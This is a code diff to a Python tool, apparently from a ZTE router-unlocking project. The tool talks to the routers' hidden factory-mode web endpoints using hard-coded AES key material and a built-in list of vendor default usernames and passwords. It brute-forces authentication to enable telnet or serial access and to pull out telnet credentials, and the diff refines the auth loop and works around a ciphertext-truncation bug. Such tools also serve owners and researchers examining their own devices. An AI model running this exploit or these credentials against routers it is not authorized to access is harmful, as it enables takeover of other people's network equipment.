@@ -4,7 +4,19 @@ import requests
 import argparse
 from random import Random
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+
+
+def pad(data_to_pad, block_size):
+    # zero-pad, pad one byte at least
+
+    padding_len = block_size-len(data_to_pad) % block_size
+    return data_to_pad+b'\x00'*padding_len
+
+
+def unpad(padded_data, block_size):
+    # zero-unpad, only work for null-terminated string
+
+    return padded_data[:-block_size] + padded_data[-block_size:].rstrip(b'\x00')
 
 
 class WebFac:
@@ -67,7 +79,7 @@ class WebFac:
             resp = self.S.post(f"http://{self.ip}:{self.port}/webFac", data=f'SendSq.gch?rand={rand}\r\n')
             if resp.status_code != 200:
                 return False
-            print(repr(resp.text))
+            # print(repr(resp.text))
 
             if len(resp.content) == 0:
                 index = rand
@@ -84,7 +96,7 @@ class WebFac:
                 key_pool = WebFacTelnet.AES_KEY_POOL_NEW
                 version = 2
             else:
-                print("protocol version not match")
+                print("protocol error")
                 return False
 
             key = map(lambda x: (x ^ 0xA5) & 0xFF, key_pool[index:index+24])
@@ -93,23 +105,22 @@ class WebFac:
             self.chiper = AES.new(key, AES.MODE_ECB)
             return version
         except requests.exceptions.ConnectionError:
-            print("protocol version not match?")
+            print("protocol error?")
         except Exception as e:
             print(e)
         return False
 
     def sendInfo(self):
         try:
-            # take from time seconds, range 0-59
             resp = self.S.post(f"http://{self.ip}:{self.port}/webFacEntry",
                                data=self.chiper.encrypt(pad(f'SendInfo.gch?info=6|'.encode(), 16)))
-            print(resp.status_code, repr(resp.text))
+            # print(resp.status_code, repr(resp.text))
             if resp.status_code == 200:
                 return True
             elif resp.status_code == 400:
                 print("protocol error")
             elif resp.status_code == 401:
-                print("user/pass error")
+                print("info error")
         except Exception as e:
             print(e)
         return False
@@ -119,12 +130,19 @@ class WebFac:
             resp = self.S.post(
                 f"http://{self.ip}:{self.port}/webFacEntry",
                 data=self.chiper.encrypt(
+                    # httpd will alloc 1 more byte to ensure null terminated, anyway we add one more null to ensure
                     pad(f'CheckLoginAuth.gch?version50&user={self.user}&pass={self.pw}'.encode(), 16)
                 ))
-            print(repr(resp.text))
+            # print(repr(resp.text))
             if resp.status_code == 200:
+                # checkLoginAuth use wrong function strlen to calc response size, so we may need to pad ciphertext first
+                # but ciphertext can still be truncated prematurely，resulting in undecryptable data
+                ciphertext = resp.content
+                # print(len(ciphertext))
+                if len(ciphertext) % 16:
+                    ciphertext = pad(ciphertext, 16)
+                url = unpad(self.chiper.decrypt(ciphertext), 16)
                 # resp should be "FactoryMode.gch"
-                url = self.chiper.decrypt(resp.content)
                 return url
             elif resp.status_code == 400:
                 print("protocol error")
@@ -148,7 +166,7 @@ class WebFacSerial(WebFac):
                 data=self.chiper.encrypt(
                     pad(f'SerialSlience.gch?action={action}'.encode(), 16)
                 ))
-            print(repr(resp.text))
+            # print(repr(resp.text))
             if resp.status_code == 200:
                 return True
             elif resp.status_code == 400:
@@ -171,15 +189,16 @@ class WebFacTelnet(WebFac):
                         pad(f'FactoryMode.gch?{action}'.encode(), 16)
                     ))
             else:
+                # mode 1:ops 2:dev 3:production 4:user
                 resp = self.S.post(
                     f"http://{self.ip}:{self.port}/webFacEntry",
                     data=self.chiper.encrypt(
-                        pad(f'FactoryMode.gch?mode=2&user=notused'.encode(), 16)
+                        pad('FactoryMode.gch?mode=2&user=notused'.encode(), 16)
                     ))
-            print(repr(resp.text))
+            # print(repr(resp.text))
             if resp.status_code == 200:
                 # resp should be "FactoryModeAuth.gch?user=<telnetuser>&pass=<telnetpass>"
-                url = self.chiper.decrypt(resp.content)
+                url = unpad(self.chiper.decrypt(resp.content), 16)
                 return url
             elif resp.status_code == 400:
                 print("protocol error")
@@ -193,84 +212,86 @@ class WebFacTelnet(WebFac):
         return False
 
 
-def dealSerial(ip, port, users, pws, action):
-    for user in users:
-        for pw in pws:
-            serial = WebFacSerial(ip, port, user, pw)
-            print("reset facTelnetSteps:")
-            if serial.reset():
-                print("reset OK")
-
-            print("\nfacStep 1:")
-            serial.requestFactoryMode()
-
-            print("\nfacStep 2:")
-            version = serial.sendSq()
-
-            if version == 1:
-                print("\nfacStep 3:")
-                serial.checkLoginAuth()
-            elif version == 2:
-                print("\nfacStep 3:")
-                if not serial.sendInfo():
-                    print("sendInfo error")
-                    return
-                print("\nfacStep 4:")
-                serial.checkLoginAuth()
-
-            print("\nfacStep 5:")
-            serial.serialSlience(action)
-
-
-def dealTelnet(ip, port, users, pws, action):
+def dealFacAuth(Class: WebFac, ip, port, users, pws):
     for user in users:
         for pw in pws:
             print(f"trying  user:\"{user}\" pass:\"{pw}\" ")
-            telnet = WebFacTelnet(ip, port, user, pw)
+            webfac: WebFac = Class(ip, port, user, pw)
             print("reset facTelnetSteps:")
-            if telnet.reset():
-                print("reset OK")
+            if webfac.reset():
+                print("reset OK!\n")
 
-            print("\nfacStep 1:")
-            telnet.requestFactoryMode()
+            print("facStep 1:")
+            webfac.requestFactoryMode()
+            print("OK!\n")
 
-            print("\nfacStep 2:")
-            version = telnet.sendSq()
+            print("facStep 2:")
+            version = webfac.sendSq()
+            print("OK!\n")
 
             if version == 1:
-                print("\nfacStep 3:")
-                if telnet.checkLoginAuth():
-                    print("\nfacStep 4:")
+                print("facStep 3:")
+                print("OK!\n")
+                if webfac.checkLoginAuth():
+                    print("facStep 4:")
+                    print("OK!\n")
             elif version == 2:
-                print("\nfacStep 3:")
-                if not telnet.sendInfo():
+                print("facStep 3:")
+                if not webfac.sendInfo():
                     print("sendInfo error")
                     return
-                print("\nfacStep 4:")
-                if not telnet.checkLoginAuth():
+                print("OK!\n")
+
+                print("facStep 4:")
+                url = webfac.checkLoginAuth()
+                if not url:
                     print("try next...\n")
                     continue
-            else:
-                pass
+                print("OK!\n")
+                print(repr(url))
+                return webfac
+    return False
 
-            print("\nfacStep 5:")
-            url = telnet.factoryMode(action)
-            if url:
-                print(telnet.factoryMode(action))
-                return
+
+def dealSerial(ip, port, users, pws, action):
+    serial = dealFacAuth(WebFacSerial, ip, port, users, pws)
+    if not serial:
+        return
+
+    print("facStep 5:")
+    if serial.serialSlience(action):
+        print("OK!\n")
+    print('done')
+    return
+
+
+def dealTelnet(ip, port, users, pws, action):
+    telnet = dealFacAuth(WebFacTelnet, ip, port, users, pws)
+    if not telnet:
+        print('No Luck!')
+        return
+
+    print("facStep 5:")
+    url = telnet.factoryMode(action)
+    if url:
+        print("OK!\n")
+        print(repr(url))
+        print('done')
+        return
 
 
 def parseArgs():
-    parser = argparse.ArgumentParser(prog='zte_factroymode', usage='https://github.com/douniwan5788/zte_modem_tools',
+    parser = argparse.ArgumentParser(prog='zte_factroymode', epilog='https://github.com/douniwan5788/zte_modem_tools',
                                      formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-    parser.add_argument('ip', nargs="?", help='route ip', default="192.168.1.1")
-    parser.add_argument('port', nargs="?", help='router http port', default=80)
-    parser.add_argument('--user', nargs='+', help='factorymode auth username', default=[
+
+    parser.add_argument('--user', '-u', nargs='+', help='factorymode auth username', default=[
                         'factorymode', "CMCCAdmin", "CUAdmin", "telecomadmin", "cqadmin",
                         "user", "admin", "cuadmin", "lnadmin", "useradmin"])
-    parser.add_argument('--pw', nargs='+', help='factorymode auth password', default=[
+    parser.add_argument('--pass', '-p', metavar='PASS', dest='pw', nargs='+', help='factorymode auth password', default=[
                         'nE%jA@5b', "aDm8H%MdA", "CUAdmin", "nE7jA%5m", "cqunicom",
-                        "1620@CTCC", "1620@CUcc", "admintelecom", "cuadmin", "lnadmin",])
+                        "1620@CTCC", "1620@CUcc", "admintelecom", "cuadmin", "lnadmin"])
+    parser.add_argument('--ip', help='route ip', default="192.168.1.1")
+    parser.add_argument('--port', help='router http port', type=int, default=80)
     subparsers = parser.add_subparsers(dest='cmd', title='subcommands',
                                        description='valid subcommands',
                                        help='supported commands')
